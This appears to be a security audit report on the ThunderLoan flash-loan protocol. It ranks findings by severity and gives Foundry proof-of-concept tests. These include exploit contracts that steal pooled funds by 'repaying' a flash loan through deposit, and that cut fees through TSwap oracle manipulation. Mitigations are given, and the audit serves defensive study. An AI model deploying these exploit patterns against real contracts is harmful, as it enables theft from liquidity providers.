## High

### [H-1] Erroneous `ThunderLoan::updateExchangeRate` in the `deposit` function causes protocol to think it has more fees than it really does, which blocks redemption and incorrectly sets the exchange rate

**Description:** In the ThunderLoan system, the `exchangeRate` is responsible for calculating the exchange rate between assetTokens and underlying tokens. In a way, it is responsible for keeping track of how many fees to give to liquidity providers.

However, the `deposit` function, updates this rate, without collecting any fees.

```javascript
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

@>      uint256 calculatedFee = getCalculatedFee(token, amount);
@>      assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

**Impact:** There are several impacts to this bug.

1. The `redeem` function is blocked, because the protocol thinks the owed tokens is more than it has.
2. Rewards are incorrectly calculated, leading to liquidity providers potentially getting way more or less than they are owed.

**Proof of Concept:**

1. LP deposits
2. User takes out a flash loan
3. It is now impossible for LP to redeem

<details>
<summary>Proof of Code</summary>

Place the following into `ThunderLoanTest.t.sol`:

```javascript
function test_redeem_after_loan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
    }
```

</details>

**Recommended Mitigation:** Remove the incorrectly updated exchange rate lines from `deposit`.

```diff
-      uint256 calculatedFee = getCalculatedFee(token, amount);
-      assetToken.updateExchangeRate(calculatedFee);
```

### [H-2] Using `ThunderLoan::deposit` instead of transferring or `ThunderLoan::repay` to "repay" flash loans means an attacker can steal funds from the protocol

**Description:** When a user takes out a flash loan in the ThunderLoan system, they are expected to pay back the funds borrowed by using the `ThunderLoan::repay` function, or transferring the funds directly. When flash loans are taken out, at the end of the transaction the `endingBalance` and the `startingBalance + fee` are compared. If the `endingBalance` is smaller, the transaction will revert and the flash loan will not have been taken out. However flash loan recipients are able to call `ThunderLoan::deposit` with borrowed funds, enabling them to pass the conditional balance check.

**Impact:** A malicious user could steal all the funds from the ThunderLoan system by "paying back" flash loans using the `deposit` function, and then withdrawing the funds again using `ThunderLoan::redeem`.

**Proof of Concept:**

<details>
<summary>Proof of Code</summary>

Place the following into `ThunderLoanTest.t.sol`:

```javascript
function test_use_deposit_instead_of_repay_to_steal_funds() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();

        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);
    }
```

Place the following contract into `ThunderLoanTest.t.sol`:

```javascript
contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /* initiator */
        bytes calldata /* params */
    )
        external
        returns (bool)
    {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}
```

</details>

**Recommended Mitigation:** Consider checking the status of flash loan recipients/loaned funds before allowing deposits to be made.

### [H-3] Mixing up variable location causes storage collisions in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`, freezing protocol

**Description:** `ThunderLoan.sol` has two variables in the following order:

```javascript
  uint256 private s_feePrecision;
  uint256 private s_flashLoanFee; // 0.3% ETH fee
```

However, the upgraded contract `ThunderLoanUpgraded.sol` has them in a different order:

```javascript
  uint256 private s_flashLoanFee; // 0.3% ETH fee
  uint256 public constant FEE_PRECISION = 1e18;
```

Due to how Solidity storage works, after the upgrade the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the position of storage variables, and removing storage variables for constant variables, breaks the storage locations as well.

**Impact:** After the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee.

More importantly, the `s_currentlyFlashLoaning` mapping with storage in the wrong storage slot.

**Proof of Concept:**

<details>
<summary>Proof of Code</summary>

Place the following into `ThunderLoanTest.t.sol`:

```javascript
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
.
.
.
function test_upgrade_breaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        console.log("Fee before:", feeBeforeUpgrade);
        console.log("Fee after:", feeAfterUpgrade);
        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
```

You can also see the storage layout difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`.

</details>

**Recommended Mitigation:** If you must remove the storage variable, leave it as blank, as to not mess up the storage slots.

```diff
+ uint256 private s_blank;
  uint256 private s_flashLoanFee; // 0.3% ETH fee
  uint256 public constant FEE_PRECISION = 1e18;
```

---

## Medium

### [M-1] Centralization Risk for trusted owners

Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.

- Found in src/protocol/ThunderLoan.sol

  ```solidity
    function updateFlashLoanFee(uint256 newFee) external onlyOwner
  ```

- Found in src/protocol/ThunderLoan.sol

  ```solidity
  	function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
  ```

- Found in src/protocol/ThunderLoan.sol

  ```solidity
  	function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
  ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol

  ```solidity
    function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
  ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol

  ```solidity
  	function updateFlashLoanFee(uint256 newFee) external onlyOwner {

  ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol

  ```solidity
  	function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }

  ```

### [M-2] Using TSwap as a price oracle leads to price/oracle manipulation attacks

**Description:** The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees.

**Impact:** Liquidity providers will get drastically reduced fees for providing liquidity.

**Proof of Concept:**

The following all happens in a single transaction.

1. User takes a flash loan from `ThunderLoan` for 1000 `tokenA`. They are charged the original fee `fee1`. During the flash loan, they do the following:
   1. User sells 1000 `tokenA`, tanking the price.
   2. Instead of repaying right away, the user takes out another flash loan for another 1000 `tokenA`.
      1. Due to the fact that the way `ThunderLoan` calculates price based on the `TSwapPool` this second flash loan is substantially cheaper.

```javascript
function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
        return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```

    3. The user then repays the first flash loan, and then repays the second flash loan.

<details>
<summary>Proof of Code</summary>

Import the following into `ThunderLoanTest.t.sol`:

```javascript
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";
```

Place the following test into `ThunderLoanTest.t.sol`:

```javascript
function test_oracle_manipulation() public {
        // 1. Setup contracts
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        // create a tsweap dex between weth / tokenA
        address tswapPool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // 2. Fund TSwap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        // ratio 100 weth / 100 tokenA
        // price 1:1
        vm.stopPrank();

        // 3. Fund ThunderLoan
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();
        // 100 weth and 100 tokenA in TSwap
        // 1000 tokenA in ThunderLoan

        // Take out a flash loan of 50 TokenA
        // swap it on the dex, tanking the price 150 TokenA -> ~80 WETH
        // take out another flash loan of 50 TokenA and see how much cheaper it is

        // 4. Take out 2 flash loans
        //  a. Nuke price of weth/tokenA on TSwap
        //  b. Show doing so greatly reduces the fees paid on ThunderLoan
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("Normal Fee is:", normalFeeCost); // 0.296147410319118389

        uint256 amountToBorrow = 50e18;
        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
            address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
        );

        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo();
        console.log("Attack Fee is:", attackFee);
        assert(attackFee < normalFeeCost);
        // 0.214167600932190305
    }
```

Add the following contract into `ThunderLoanTest.t.sol`:

```javascript
contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    BuffMockTSwap tswapPool;
    ThunderLoan thunderLoan;
    address repayAddress;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /* initiator */
        bytes calldata /* params */
    )
        external
        returns (bool)
    {
        if (!attacked) {
            // 1. Swap TokenA borrowed for WETH
            // 2. Take out ANOTHER flash loan, to show the difference
            feeOne = fee;
            attacked = true;
            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tswapPool), 50e18);
            // tanks the price
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
            // call a second flash loan
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // repay
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            // calculate the fee and repay
            feeTwo = fee;
            // repay
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
```

</details>

**Recommended Mitigation:** Consider using a different price oracle mechanism such as Chainlink Pricefeeds with a Uniswap TWAP fallback oracle.

---

## Informational

### [I-1] Functions not used internally could be marked external

```javascript
function repay(IERC20 token, uint256 amount) public {
```

### [I-2] Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

- Found in src/protocol/OracleUpgradeable.sol [Line: 16](src/protocol/OracleUpgradeable.sol#L16)

  ```solidity
          s_poolFactory = poolFactoryAddress;
  ```

### [I-3] Constants should be defined and used instead of literals

### [I-4] Event is missing `indexed` fields

Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

### [I-5] Test coverage needs to be higher
